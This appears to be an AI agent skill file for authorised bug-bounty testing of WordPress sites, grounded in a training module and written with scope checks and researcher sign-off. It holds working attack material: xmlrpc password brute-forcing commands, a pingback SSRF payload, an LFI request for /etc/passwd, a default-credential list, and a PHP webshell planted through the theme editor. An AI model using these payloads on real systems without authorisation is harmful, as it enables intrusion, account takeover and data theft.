---
name: wordpress
description: WordPress security testing — version detection, plugin/theme enumeration, user enumeration, xmlrpc.php attacks (brute force, pingback SSRF, method enumeration), REST API exploitation, WPScan-driven vulnerability discovery, theme editor RCE after admin login. Use when WordPress is detected via meta generator tag, wp-content paths, or login URL at /wp-admin or /wp-login.php.
---

# WordPress Security Testing

Grounded in the CBBH Hacking Wordpress module. Read top-to-bottom on first engagement with a WP target; jump to the relevant section on subsequent runs.

---

## 1. Triggers — when this skill applies

- HTML source contains `<meta name="generator" content="WordPress X.X.X">`
- URLs contain `/wp-content/`, `/wp-includes/`, `/wp-admin/`, `/wp-login.php`
- `readme.html` or `license.txt` accessible at root
- `xmlrpc.php` responds to GET with "XML-RPC server accepts POST requests only"
- `wp-json/` endpoint returns data
- Cookie names starting with `wordpress_`, `wp-settings-`

---

---

## 3. 30-second triage

```bash
# Version check
curl -s https://target.com | grep '<meta name="generator"'

# Login page
curl -sI https://target.com/wp-login.php | grep 'HTTP/'
curl -sI https://target.com/wp-admin/ | grep 'HTTP/'

# xmlrpc.php
curl -s https://target.com/xmlrpc.php

# REST API user enum
curl -s https://target.com/wp-json/wp/v2/users | python3 -m json.tool
```

If any of these return non-404, WordPress is confirmed.

---

## 4. Version detection

```bash
# Meta generator tag
curl -s https://target.com | grep '<meta name="generator"'

# readme.html (often reveals version)
curl -s https://target.com/readme.html | grep -i 'version'

# RSS feed
curl -s "https://target.com/?feed=rss2" | grep '<generator>'

# Login page JS (sometimes version in path)
curl -sI https://target.com/wp-login.php

# License.txt
curl -s https://target.com/license.txt | head -5
```

Once version is known, check wpscan.io for known CVEs.

---

## 5. WPScan enumeration

Give this to the researcher as [RUN THIS]:

```
[RUN THIS]
wpscan --url https://target.com \
  --enumerate u,p,t,vp,vt,tt,cb,dbe \
  --api-token YOUR_WPSCAN_TOKEN \
  --output /home/gg/bugbounty/TARGET/wpscan-output.txt
```

Flags:
- `u` — enumerate users
- `p` — enumerate popular plugins
- `t` — enumerate popular themes
- `vp` — enumerate vulnerable plugins
- `vt` — enumerate vulnerable themes
- `tt` — enumerate timthumbs
- `cb` — enumerate config backups
- `dbe` — enumerate database exports

**Password brute force via xmlrpc** (faster than wp-login):
```
[RUN THIS]
wpscan --password-attack xmlrpc \
  -t 20 \
  -U admin,editor \
  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  --url https://target.com
```

---

## 6. Plugin and theme enumeration (manual)

```bash
# Plugin enumeration from page source
curl -s https://target.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | \
  grep 'wp-content/plugins/*' | cut -d"'" -f2

# Theme enumeration from page source
curl -s https://target.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | \
  grep 'themes' | cut -d"'" -f2
```

Active plugin probe (check existence directly):
```bash
# Test if a specific plugin exists
curl -sI https://target.com/wp-content/plugins/mail-masta/
# 301 = exists; 404 = does not exist
```

For discovered plugins and themes, search exploitdb and wpscan.io for known CVEs:
```bash
# Search exploit-db
searchsploit "wordpress plugin PLUGIN_NAME"
```

---

## 7. User enumeration

### Method 1: Author ID enumeration

```bash
# Check author IDs — WordPress redirects to author page with username
for id in 1 2 3 4 5; do
  result=$(curl -sI "https://target.com/?author=${id}" | grep -i 'location')
  echo "ID $id: $result"
done
```

### Method 2: REST API

```bash
curl -s https://target.com/wp-json/wp/v2/users | python3 -m json.tool
```

Returns usernames and IDs for any user who has published a post (pre-4.7.1 returns all users).

### Method 3: Login page error message

If login error messages distinguish between "invalid username" and "incorrect password", username enumeration is possible.

---

## 8. xmlrpc.php attacks

### 8.1 Check if xmlrpc.php is enabled

```bash
curl -s https://target.com/xmlrpc.php
# Should return: "XML-RPC server accepts POST requests only"
```

### 8.2 List available methods (user enumeration)

```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -d '<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>'
```

Key methods to note: `wp.getUsersBlogs`, `wp.getUsers`, `wp.getPosts`, `pingback.ping`, `system.multicall`

### 8.3 Password brute force via wp.getUsersBlogs

Single test (replace password):
```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>admin</value></param>
<param><value>PASSWORD_HERE</value></param></params></methodCall>'
```

Success: returns blog list with `isAdmin: 1`
Failure: returns `403 Incorrect username or password`

For bulk brute force, use WPScan (section 5) — it's faster via xmlrpc.

### 8.4 system.multicall for rate-limit bypass

`system.multicall` allows multiple method calls in a single HTTP request. If rate limiting is per-request, you can brute force thousands of passwords with one HTTP call.

### 8.5 pingback.ping — SSRF / IP disclosure

If `pingback.ping` is available, the WordPress server will make an outbound HTTP request to any URL:

```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>pingback.ping</methodName>
<params>
<param><value><string>http://YOUR_LISTENER_IP:PORT/</string></value></param>
<param><value><string>https://target.com/any-post/</string></value></param>
</params></methodCall>'
```

Use cases:
- **IP disclosure:** If the site is behind Cloudflare/proxy, the pingback request comes from the real origin server IP
- **SSRF:** Point the pingback to internal network resources (`http://192.168.1.1/admin`)
- **XSPA (Cross-Site Port Attack):** Point to the site itself on different ports to probe open ports

For blind SSRF confirmation, use `YOUR_EZXSS_DOMAIN/wp-pingback` as the callback URL.

---

## 9. RCE via theme editor (post-auth)

After obtaining admin credentials:

1. Log in to WordPress admin at `/wp-admin/`
2. Navigate to **Appearance → Theme Editor**
3. Select an **inactive** theme (e.g., Twenty Seventeen) — not the active theme
4. Select a non-critical PHP file (e.g., `404.php`)
5. Add the webshell:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
6. Click Update File
7. Execute:
   ```bash
   curl "https://target.com/wp-content/themes/twentyseventeen/404.php?cmd=id"
   ```

**Cleanup:** Remove the webshell immediately after confirming RCE for the PoC. Do not leave persistence.

---

## 10. Default credentials

Try these before running a brute force:

| Username | Password |
|---|---|
| admin | admin |
| admin | password |
| admin | 123456 |
| admin | wordpress |
| admin | (blank) |
| administrator | administrator |

Also check for any username enumerated in step 7.

---

## 11. WPScan result exploitation

Common plugin vulnerabilities discovered by WPScan:

**LFI in mail-masta plugin:**
```bash
curl "https://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

**After WPScan confirms a vulnerable plugin:**
- Search exploit-db: `searchsploit "wordpress plugin PLUGIN_NAME VERSION"`
- Check wpscan.io vulnerability page for PoC
- Look for unauthenticated LFI, SQLi, RCE, file upload

---

## 12. WordPress REST API abuse

```bash
# List users (may expose usernames)
curl -s https://target.com/wp-json/wp/v2/users

# List posts (may reveal draft posts, internal content)
curl -s https://target.com/wp-json/wp/v2/posts?status=draft \
  -H "Authorization: Bearer TOKEN"

# Plugin endpoints (IDOR, mass assignment candidates)
curl -s https://target.com/wp-json/
```

Check the REST API route list at `/wp-json/` for custom plugin routes — these are often less secured.

---

## 13. False-positive checks

- **xmlrpc.php disabled:** If it returns 403 or 404, xmlrpc attacks don't apply. Confirm with HEAD request.
- **User enumeration via REST API but no public posts:** WP 4.7.1+ only exposes users who have published posts. If no posts exist, no user is returned.
- **Theme editor disabled:** Some hosts disable theme editing via `define('DISALLOW_FILE_EDIT', true)` in wp-config.php — the menu item won't appear.
- **WPScan flags vulnerabilities but they require authentication you don't have:** Note the vuln but don't report without a working auth chain.

---

## 14. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| User enumeration → brute force admin | `auth-bypass` | Admin account compromise |
| Admin credentials → theme editor RCE | `cmdi` | Full server compromise |
| xmlrpc pingback → SSRF | `ssrf` | Internal network access |
| Plugin LFI → source code read | `lfi` | Credential exposure, further attack |
| Plugin SQLi → DB dump | `sqli` | Full data breach |
| Plugin file upload → webshell | `file-upload` | RCE |
| wp-config.php exposed → DB creds | `info-disclosure` | DB compromise |

---

## 15. Reporting template

```
POTENTIAL FINDING: WordPress [Version Disclosure | User Enumeration | xmlrpc SSRF/Brute | Plugin LFI/SQLi | RCE]
Target: <WordPress site URL>
WordPress version: <version if detectable>
Finding: <specific issue>

Evidence:
  <command and response excerpt>
  e.g. "curl https://target.com/xmlrpc.php returned pingback response with origin IP X.X.X.X"
  or "Plugin mail-masta 1.0 confirmed via WPScan; LFI PoC: /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd returns /etc/passwd"

Impact:
  <e.g. "Origin IP disclosed behind Cloudflare — enables direct-to-origin attacks bypassing WAF"
   or "Unauthenticated LFI in mail-masta allows reading arbitrary server files"
   or "Admin credentials obtained → theme editor RCE as www-data">

Severity: <Info | Low | Medium | High | Critical>

Chain potential: <LFI → creds → admin → RCE, etc.>
Next step: <test credentials against wp-admin | develop RCE PoC | enumerate other plugins>
```

---

## 16. Recon tracker vector strings

Only log if the user explicitly authorizes:

- `wordpress:version:<X.X.X>` — WP version detected
- `wordpress:xmlrpc-enabled` — xmlrpc.php responds
- `wordpress:user-enum:<username>` — username confirmed
- `wordpress:plugin:<name>:<version>` — plugin enumerated
- `wordpress:plugin-vuln:<name>:<CVE>` — vulnerable plugin found
- `wordpress:pingback-ssrf` — pingback confirmed OOB hit
- `wordpress:admin-creds:<user>` — admin credentials obtained

---

## 17. What NOT to do

- **Do not brute force via wp-login.php directly** — this is slow and often triggers lockouts. Use xmlrpc for brute force.
- **Do not leave webshells** in the theme editor after PoC. Remove immediately.
- **Do not run WPScan aggressively** without checking rate limits in `program-guidelines.txt`.
- **Do not test xmlrpc.php brute force** without researcher authorization for automated tooling — give WPScan command as [RUN THIS].
- **Do not exfiltrate full database** via SQL injection in a plugin. Prove with one record and stop.
- **Do not auto-log to the recon tracker** without explicit user instruction.
- **Do not test out-of-scope WordPress instances** — check `scope.txt`.
